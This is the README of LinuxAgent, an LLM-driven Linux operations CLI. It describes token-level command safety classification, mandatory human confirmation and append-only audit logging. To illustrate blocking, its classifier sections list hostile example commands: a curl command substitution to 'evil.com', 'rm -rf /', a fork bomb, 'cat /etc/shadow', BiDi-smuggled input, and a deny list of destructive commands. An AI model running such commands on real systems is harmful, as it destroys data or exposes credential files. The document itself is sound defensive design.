<div align="center">
  <h1>LinuxAgent</h1>
  <img src="logo.jpg" alt="LinuxAgent Logo" width="320" />

  <p>
    <a href="https://github.com/Eilen6316/LinuxAgent.git"><img src="https://img.shields.io/badge/GitHub-项目仓库-black?style=flat-square&logo=github" alt="GitHub"></a>
    <a href="https://gitcode.com/qq_69174109/LinuxAgent.git"><img src="https://img.shields.io/badge/GitCode-项目仓库-blue?style=flat-square&logo=git" alt="GitCode"></a>
    <a href="https://gitee.com/xinsai6316/LinuxAgent.git"><img src="https://img.shields.io/badge/Gitee-项目仓库-red?style=flat-square&logo=gitee" alt="Gitee"></a>
    <a href="http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=o2ByKsl_gBN-fODJxH4Ps4Xboa_hCSI3&authKey=nVfsLJBin1CnZBd9pPNkxFk%2FGFqCe1FLsRMQmmxv%2FQnM78bC%2FjcWyMSeQcJDZC1U&noverify=0&group_code=281392454"><img src="https://img.shields.io/badge/QQ群-281392454-brightgreen?style=flat-square&logo=tencent-qq" alt="QQ Group"></a>
    <a href="https://blog.csdn.net/qq_69174109/article/details/146365413"><img src="https://img.shields.io/badge/CSDN-项目介绍-blue?style=flat-square&logo=csdn" alt="CSDN"></a>
  </p>

  <p><em>LLM 驱动、带强制人机确认的 Linux 运维 CLI 助手</em></p>

  <p>
    <a href="README.md">English README</a> ·
    <a href="README_EN.md">Full English</a>
  </p>
</div>

---

## 项目介绍

**LinuxAgent** 把自然语言运维请求翻译成可以放心执行的 Linux 命令。每条由模型生成的命令都会经过 token 级安全分类，每个有副作用的动作都需要真人在终端里按下 `y`，每个决策都写入 append-only 审计日志。

项目基于 **LangGraph** 的状态机编排、**LangChain** 的模型抽象、**Pydantic v2** 的 fail-fast 配置校验，默认不依赖任何本地深度学习模型。

### 适用场景

- 日常 Linux 运维：查文件、看日志、查资源占用、排查服务状态
- SSH 集群操作：对多台主机执行同一条命令，自动走批量确认流程
- 交互式故障排查：让模型给出候选命令，由你决定是否执行
- 带审计要求的环境：所有操作留痕到本地 JSONL 日志

### 设计原则

1. **模型不可信**：LLM 生成的命令默认需要人工确认，不会因为语言模型"看起来很聪明"就免检
2. **破坏性永不放行**：`rm -rf` / `mkfs` / `systemctl stop` 等无论之前批准过多少次都会再次弹窗
3. **批量必显式**：SSH 到 2 台及以上主机默认走批量确认，不静默扩散
4. **决策必留痕**：每次审批、执行、拒绝都写入 `~/.linuxagent/audit.log`
5. **无 TTY 自动拒绝**：脚本化调用遇到 CONFIRM 请求一律默认拒绝，不会静默绕过

---

## 核心能力

| 能力 | 说明 |
|---|---|
| 自然语言 → 命令 | 基于 Prompt + Tool Calling，支持 OpenAI / DeepSeek / Anthropic Claude |
| 结构化计划 | LLM 输出必须先通过 JSON `CommandPlan` 校验，再进入策略判断和执行 |
| 策略引擎 | `SAFE` / `CONFIRM` / `BLOCK`，并输出 `risk_score`、`capabilities`、审计用 `matched_rule` |
| Runbook | 内置 8 个 YAML Runbook，覆盖磁盘、端口、服务、日志、证书、内存、负载、容器 |
| Human-in-the-Loop | LangGraph `interrupt()` + `MemorySaver`，支持中断 / 持久化 / 恢复 |
| 会话白名单 | 同一进程内批准过的 SAFE 命令下次免确认，破坏性命令永不入白名单 |
| 集群批量执行 | SSH 连接池 + 并发扇出 + 失败隔离，异步包装 paramiko |
| 审计日志 | JSONL append-only，文件权限 `0o600`，不轮转，无法关闭 |
| 智能模块 | 命令使用统计、语义相似度检索（API embedding）、推荐引擎、知识库 |
| 可测试性 | 217 个单元测试 + 10 个 HITL YAML 场景 + 集成测试骨架，覆盖率 87%+ |

---

## 30 秒了解执行流程

```
你: 找一下监听 8080 端口的服务

 ┌─────────────────┐
 │  parse_intent   │   LLM 提议：ss -tlnp sport = :8080
 └────────┬────────┘
          ▼
 ┌─────────────────┐
 │  safety_check   │   token 级分类 → CONFIRM (LLM 首次)
 └────────┬────────┘
          ▼
 ┌─────────────────┐
 │     confirm     │   终端弹出确认面板：
 │  (interrupt)    │     Command: ss -tlnp sport = :8080
 │                 │     Safety:  CONFIRM
 │                 │     Rule:    LLM_FIRST_RUN
 │                 │     Source:  llm
 │                 │   > Allow this operation? [y/N]
 └────────┬────────┘
          ▼ y
 ┌─────────────────┐
 │     execute     │   asyncio.create_subprocess_exec(*argv)
 └────────┬────────┘
          ▼
 ┌─────────────────┐
 │     analyze     │   LLM 把原始输出整理成运维视角的解读
 └────────┬────────┘
          ▼
        你 ← "nginx (PID 4312) 正在监听 8080，属于 root"

 每一步都追加到 ~/.linuxagent/audit.log
```

---

## 与旧版本的全面对比

前身是一个单体 Agent 脚本。为了拿到生产环境做运维，当前版本从**算法、架构、安全、测试**四个维度彻底重写。

### 架构层面

| 维度 | 旧实现 | 当前 `v4` |
|---|---|---|
| 主 Agent 类 | 单个 4710 行 God Object，内含意图解析、执行、UI、SSH、监控 | `app/agent.py` **72 行**的瘦协调器，仅拼装 graph / ui / services |
| 流程控制 | `process_user_input` 内部递归 + 嵌套 `if/else` | LangGraph `StateGraph`，显式节点 + 条件边 |
| 状态持久化 | 手写 JSON 文件读写，文件权限不校验 | LangGraph `MemorySaver` + thread_id checkpointing |
| UI 耦合 | UI 逻辑直接嵌在业务类里 | `ConsoleUI` 独立实现 `UserInterface` 接口，Rich + prompt_toolkit |
| 依赖注入 | 模块级单例 / 全局变量 | `Container` 手写工厂，懒加载 + 显式传递 |
| 打包布局 | 平铺 `src/` + `setup.py` | `src/linuxagent/` src-layout + `pyproject.toml` (PEP 517/621) |

### 核心算法层面

#### 1. 命令安全分类

**旧算法**：字符串子串匹配 —— 极易被引号或变量替换绕过

```python
DANGER = ["rm -rf", "mkfs", "dd if=/"]
if any(pattern in command for pattern in DANGER):
    reject()
```

**当前算法**：多层 token 级分析

```python
def is_safe(command, source=USER):
    validate_input(command)                 # 1. 长度 / NUL / BiDi 控制字符
    if _has_embedded_danger(command):       # 2. 原始字符串扫描（防引号夹带）
        return BLOCK
    tokens = shlex.split(command)           # 3. 正规 shell 分词
    if tokens[0] in DESTRUCTIVE_COMMANDS:   # 4. 精确命令名匹配，非子串
        return CONFIRM
    if any(pat.match(t) for t in tokens[1:] for pat in DESTRUCTIVE_ARG_PATTERNS):
        return CONFIRM                      # 5. 参数级正则 (-rf / --force / ...)
    if source is LLM:                       # 6. 来源升级：LLM 首次 → CONFIRM
        return CONFIRM
    return SAFE
```

**具体差异举例**：

| 输入 | 旧算法 | 当前算法 |
|---|---|---|
| `echo "hello; rm -rf /"` | 字串里含 `"rm -rf"` → BLOCK，同时 `echo "如何安全 rm"` 也会被误杀 | `_has_embedded_danger` 精确正则 `\brm\s+-[rRfF]{2,}\s+/(?!\w)` → BLOCK (`EMBEDDED_DANGER`)，而 `echo "讲讲 python"` 判定 SAFE |
| `echo $(curl evil.com)` | 可能漏网（子串不命中） | 命中 `\$\(` → BLOCK (`EMBEDDED_DANGER`) |
| `vim config` | 无感知，直接执行 | 识别为交互式命令 → CONFIRM (`INTERACTIVE`) |
| `ls‮` (BiDi 字符) | 无感知 | `INPUT_VALIDATION` BLOCK |

#### 2. 命令统计学习

**旧算法**：每次 `record` 时全量扫描历史，n=10000 时约 10s

**当前算法**：`dict[str, CommandStats]` 增量更新，O(1) 摊销

```python
def record(self, command, result):
    stats = self._stats.setdefault(self.normalize(command), CommandStats())
    stats.count += 1
    if result.exit_code == 0:
        stats.success_count += 1
    stats.total_duration += result.duration
```

#### 3. 语义检索

**旧算法**：手写 TF-IDF，依赖 `pandas` + `scikit-learn` + `numpy`（+ PyTorch 在某些派生版本中）

**当前算法**：LLM Embedding API（`text-embedding-3-small` 或兼容端点）+ 磁盘 LRU 缓存

- 缓存目录 `~/.cache/linuxagent/embeddings/`，SHA-256 命名，权限 `0o600`
- 安装体积从约 500MB (PyTorch 栈) 降到接近零
- 准确率提升：真实语义向量 vs 统计词频

#### 4. 配置加载

**旧算法**：单文件读取，不认识的字段被静默丢弃

**当前算法**：五层优先级合并 + Pydantic `extra="forbid"` fail-fast + YAML 行号错误报告

```
1. --config <path>                     CLI 参数（最高）
2. LINUXAGENT_CONFIG 环境变量指向的路径
3. ./config.yaml                       当前目录
4. ~/.config/linuxagent/config.yaml    XDG
5. 包内置 configs/default.yaml         （最低）
```

- 显式路径（1 / 2）文件不存在 → 立即 `ConfigError`
- Auto-discovery 路径（3 / 4）缺失时静默跳过
- 用户文件必须 `chmod 0600` 且当前用户所有，否则拒绝启动
- 校验失败时错误报告带 YAML 行号：`api.timeout: Input should be valid at line 12`

#### 5. SSH 主机信任

**旧算法**：`AutoAddPolicy`，首次连接自动接受任何 host key → 中间人攻击入口

**当前算法**：`RejectPolicy` + `load_system_host_keys()`，未登记主机直接抛 `SSHUnknownHostError`

```python
if self._allow_unknown_hosts:
    # 需要显式 opt-in；WarningPolicy 每次连接打印警告
    client.set_missing_host_key_policy(paramiko.WarningPolicy())
else:
    client.set_missing_host_key_policy(paramiko.RejectPolicy())
```

CI 有 `! grep -rn "AutoAddPolicy" src/linuxagent/` 红线门禁，代码层面杜绝回滚。

### 安全模型对比

| 策略 | 旧实现 | 当前 `v4` |
|---|---|---|
| 模型首次生成命令 | 直接执行 | 强制 CONFIRM（`LLM_FIRST_RUN`） |
| 批准后再次执行 | 每次都要重审 | 同一会话免确认（白名单），进程退出即失效 |
| 破坏性命令 | 基于字符串黑名单 | token 匹配 + 原始扫描 + 子命令正则三重门禁，**永不**入白名单 |
| 批量集群操作 | 静默扩散 | 目标数 ≥ `cluster.batch_confirm_threshold`（默认 2）强制 CONFIRM |
| 非交互环境 | 可能绕过 | 无 TTY 时 confirm 自动返回 `non_tty_auto_deny` |
| 审计记录 | 日志可选 | 每条 HITL 事件以 hash chain 追加到 `~/.linuxagent/audit.log`，`0o600`，可用 `linuxagent audit verify` 校验 |

### 测试与工程化

| 维度 | 旧实现 | 当前 `v4` |
|---|---|---|
| 单元测试 | 0 | **217 通过** |
| 覆盖率 | 0 | **87.13%**（`--cov-fail-under=80` 门禁） |
| 静态检查 | 无 | `ruff check` + `mypy --strict` + `bandit` 全通过 |
| 红线门禁 | 无 | CI 中 grep 检查 `shell=True` / `AutoAddPolicy` / 裸 `except:` / graph 节点内 `input(` |
| E2E 场景 | 无 | 10 个 YAML 场景覆盖普通命令 / 危险命令 / HITL / 批量集群 |
| 发布流程 | 手动 | tag 触发 GitHub Actions 构建 wheel + sdist + Release |

---

## 安装

### 自动化（推荐）

```bash
git clone https://github.com/Eilen6316/LinuxAgent.git
cd LinuxAgent
./scripts/bootstrap.sh     # 建 .venv + pip install -e ".[dev]" + seed config.yaml(0600)
source .venv/bin/activate
```

### 手动

```bash
python3.11 -m venv .venv   # 或 python3.12
source .venv/bin/activate
pip install -e ".[dev]"
cp configs/example.yaml config.yaml
chmod 600 config.yaml      # 必须！loader 拒绝非 0600 的用户配置
```

### 可选扩展

```bash
pip install -e ".[anthropic]"     # Claude 支持
pip install -e ".[pyinstaller]"   # 打包单二进制
```

### 运行时要求

- Python 3.11 或 3.12
- Linux（macOS 可用于开发，Windows 未支持）
- 如使用集群功能：本地 `~/.ssh/known_hosts` 已登记目标主机

---

## 配置

### 最小可用配置

```yaml
# ./config.yaml (chmod 600)
api:
  api_key: "sk-replace-me"   # 必填
```

其他字段全部用默认值即可（默认 provider 为 DeepSeek，可改为 `openai` / `anthropic`）。

### 验证配置

```bash
linuxagent check
# 输出示例：
# OK: provider=deepseek, model=deepseek-chat,
#     batch_confirm_threshold=2, audit_log=/home/you/.linuxagent/audit.log
```

### 配置字段参考

| 段 | 字段 | 默认值 | 说明 |
|---|---|---|---|
| `api` | `provider` | `deepseek` | 可选 `openai` / `deepseek` / `anthropic` |
| `api` | `base_url` | `https://api.deepseek.com/v1` | OpenAI 兼容端点 |
| `api` | `model` | `deepseek-chat` | 模型名 |
| `api` | `api_key` | `""` | **必填**；`SecretStr`，不出现在 repr/日志 |
| `api` | `timeout` | `30.0` | 单次请求超时（秒） |
| `api` | `stream_timeout` | `60.0` | 流式整体超时（秒） |
| `api` | `max_retries` | `3` | 指数退避重试次数 |
| `security` | `command_timeout` | `30.0` | 本地命令最长执行时间 |
| `security` | `max_command_length` | `2048` | 单条命令字符上限 |
| `security` | `session_whitelist_enabled` | `true` | 会话白名单开关 |
| `cluster` | `batch_confirm_threshold` | `2` | 批量确认阈值（主机数） |
| `cluster` | `hosts` | `[]` | 集群主机列表 |
| `audit` | `path` | `~/.linuxagent/audit.log` | 审计日志位置；**审计无法关闭** |
| `telemetry` | `exporter` | `local` | 默认本地 JSONL span；`none` 禁用写入 |
| `telemetry` | `path` | `~/.linuxagent/telemetry.jsonl` | 本地 telemetry 路径 |
| `ui` | `theme` | `auto` | `auto` / `light` / `dark` |
| `ui` | `max_chat_history` | `20` | 会话上下文最大消息数 |
| `logging` | `level` | `INFO` | `DEBUG` / `INFO` / `WARNING` / ... |
| `logging` | `format` | `console` | `console`（Rich 彩色） / `json`（生产） |
| `intelligence` | `embedding_model` | `text-embedding-3-small` | 语义检索模型；**禁止本地 PyTorch 模型** |

完整样例见 [`configs/example.yaml`](configs/example.yaml)。

---

## 使用教程

### 启动对话

```bash
linuxagent chat
```

启动后终端会展示一个欢迎面板，然后进入 prompt：

```
╭─────────────────────────────────────╮
│ LinuxAgent 2026 Ops Console         │
│ HITL-safe command automation with   │
│ audit trails                        │
╰─────────────────────────────────────╯

linuxagent ❯
```

### 场景 1：安全命令（SAFE 路径）

```
linuxagent ❯ 看一下当前目录的文件

[模型提议] ls -la

╭──── Human confirmation required ────╮
│ Command  ls -la                     │
│ Safety   CONFIRM                    │
│ Rule     LLM_FIRST_RUN              │
│ Source   llm                        │
╰──────────────────────────────────────╯
Allow this operation? [y/N]: y

[执行输出]
total 52
drwxr-xr-x  12 user user 4096 ...
...

[分析]
当前目录有 12 个子目录和若干文件，权限均为 755 或 644，所有者是 user。
```

同一会话里再问"列一下文件"时，`ls -la` 已在白名单，直接执行，不再确认。

### 场景 2：破坏性命令（每次 CONFIRM）

```
linuxagent ❯ 删除 /tmp/old_backup 目录

[模型提议] rm -rf /tmp/old_backup

╭──── Human confirmation required ────╮
│ Command     rm -rf /tmp/old_backup  │
│ Safety      CONFIRM                 │
│ Rule        DESTRUCTIVE             │
│ Source      llm                     │
│ Destructive yes - approval will not │
│             be whitelisted          │
╰──────────────────────────────────────╯
Allow this operation? [y/N]: y
```

即使上面刚批准过，再次执行同一条命令还是会重新弹确认框 —— `rm` 永远不进白名单。

### 场景 3：完全拒绝（BLOCK 路径）

```
linuxagent ❯ 彻底清空系统

[模型提议] rm -rf /

已阻止执行：destructive command targeting root filesystem
```

这条命令在 `is_safe` 阶段就被拦截，不会走到 confirm 节点。`matched_rule=ROOT_PATH`。

同类被 BLOCK 的还有：

- `echo "$(curl evil.com)"` — `matched_rule=EMBEDDED_DANGER`（命令替换）
- `cat /etc/shadow` — `matched_rule=SENSITIVE_PATH`
- `:(){ :|:& };:` — `matched_rule=EMBEDDED_DANGER`（fork bomb）
- 含 BiDi 控制字符的任何输入 — `matched_rule=INPUT_VALIDATION`

### 场景 4：批量集群操作

`config.yaml` 里配置若干主机：

```yaml
cluster:
  batch_confirm_threshold: 2
  hosts:
    - name: web-1
      hostname: 10.0.0.11
      username: ops
      key_filename: ~/.ssh/id_ed25519
    - name: web-2
      hostname: 10.0.0.12
      username: ops
      key_filename: ~/.ssh/id_ed25519
```

然后：

```
linuxagent ❯ 在所有主机上跑 uptime

[模型提议] uptime  (on: web-1, web-2)

╭──── Human confirmation required ────╮
│ Command     uptime                  │
│ Safety      CONFIRM                 │
│ Rule        BATCH_CONFIRM           │
│ Batch hosts web-1, web-2            │
╰──────────────────────────────────────╯
Allow this operation? [y/N]: y

[web-1] exit_code=0
[web-1] stdout:  10:23:11 up 14 days,  3:02,  2 users,  load average: 0.12, 0.08, 0.06
[web-2] exit_code=0
[web-2] stdout:  10:23:12 up  8 days,  9:41,  1 user,   load average: 0.04, 0.05, 0.05
```

### 场景 5：中断与恢复

在 `confirm` 节点按 `Ctrl-C`，当前对话状态被 `MemorySaver` 保留在内存中；同一进程内再次触发同一 `thread_id` 时可从断点继续。具体使用方式见 [docs/development.md](docs/development.md)。

### 示例自然语言输入

- `查看 /var 的磁盘占用`
- `检查 nginx 服务状态`
- `在日志里找 ssh 登录失败记录`
- `谁还在占用 8080 端口`
- `看看 systemd 启动时间`
- `在所有主机上检查磁盘剩余空间`

---

## 审计日志

每次 HITL 事件以一行 hash-chained JSON 追加到 `~/.linuxagent/audit.log`：

```json
{"ts": "2026-04-24T10:23:10.123+08:00", "event": "confirm_begin",
 "audit_id": "a1b2c3", "command": "uptime", "safety_level": "CONFIRM",
 "matched_rule": "BATCH_CONFIRM", "command_source": "llm",
 "trace_id": "t1", "batch_hosts": ["web-1", "web-2"],
 "prev_hash": "0000...", "hash": "9f86..."}
{"ts": "2026-04-24T10:23:14.456+08:00", "event": "confirm_decision",
 "audit_id": "a1b2c3", "decision": "yes", "latency_ms": 4333,
 "trace_id": "t1", "prev_hash": "9f86...", "hash": "3a6e..."}
{"ts": "2026-04-24T10:23:15.890+08:00", "event": "command_executed",
 "audit_id": "a1b2c3", "command": "uptime", "exit_code": 0,
 "duration_ms": 187, "trace_id": "t1", "batch_hosts": ["web-1", "web-2"],
 "prev_hash": "3a6e...", "hash": "b4c1..."}
```

校验完整性：

```bash
linuxagent audit verify
```

常用事后复盘：

```bash
# 所有被批准的操作
jq 'select(.event=="confirm_decision" and .decision=="yes")' ~/.linuxagent/audit.log

# 按 audit_id 串出某次操作完整链路
jq 'select(.audit_id=="a1b2c3")' ~/.linuxagent/audit.log

# 按 trace_id 串出一次图执行链路
jq 'select(.trace_id=="t1")' ~/.linuxagent/audit.log

# 近 1 小时被拒绝的
jq 'select(.event=="confirm_decision" and .decision!="yes")' ~/.linuxagent/audit.log
```

---

## 常见问题

**Q：`linuxagent check` 报 `must have permissions 0600`？**
A：R-SEC-04 强制用户配置必须是 `0o600` + 当前用户所有。运行 `chmod 600 config.yaml`。

**Q：`linuxagent chat` 报 `api.api_key is required`？**
A：在 `./config.yaml` 的 `api.api_key` 填入真实 key。

**Q：为什么我的命令被 BLOCK？**
A：看 stderr 里的 `matched_rule`：

- `EMBEDDED_DANGER`：原始字符串扫出危险模式（常见于 LLM 在 echo 字符串里夹带）
- `SENSITIVE_PATH`：触及 `/etc/shadow` / `/boot` 等
- `ROOT_PATH`：目标是根文件系统
- `INPUT_VALIDATION`：长度 / NUL / BiDi 控制字符
- `PARSE_ERROR`：shlex 无法解析

**Q：`--yes` / `--no-confirm` 能跳过所有确认吗？**
A：按设计不允许。`--yes` 只会降级对话级确认，命令级 CONFIRM / BLOCK 不受影响。非交互脚本调用会遇到 `non_tty_auto_deny`。

**Q：审计日志可以关吗？**
A：不能。`AuditConfig` 只有 `path` 字段，没有 `enabled`。

**Q：想让 LinuxAgent 在一个没有 `known_hosts` 的新环境里 SSH？**
A：在代码里构造 `SSHManager(config, allow_unknown_hosts=True)`；当前 CLI 暂未暴露此开关，避免误用。

**Q：可以用自己的 OpenAI 兼容网关吗？**
A：可以。把 `api.base_url` 换成你的网关地址，`api.model` 换成它支持的模型名即可。

---

## 开发

```bash
make install   # pip install -e ".[dev]"
make test      # pytest + 80% fail-under，当前 87%+
make lint      # ruff check
make type      # mypy --strict
make security  # 红线 grep + bandit
make harness   # YAML 场景 harness
make build     # wheel + sdist
linuxagent audit verify
```

更多细节见 [docs/development.md](docs/development.md)。

---

## 发布

```bash
python -m tests.harness.runner --scenarios tests/harness/scenarios
python -m build --no-isolation
./scripts/verify_wheel_install.sh
git tag v4.0.0
git push origin v4.0.0     # 触发 release.yml
```

详见 [docs/release.md](docs/release.md)。

---

## 文档

- [快速开始](docs/quickstart.md)
- [开发指南](docs/development.md)
- [发布指南](docs/release.md)

---

## License

MIT
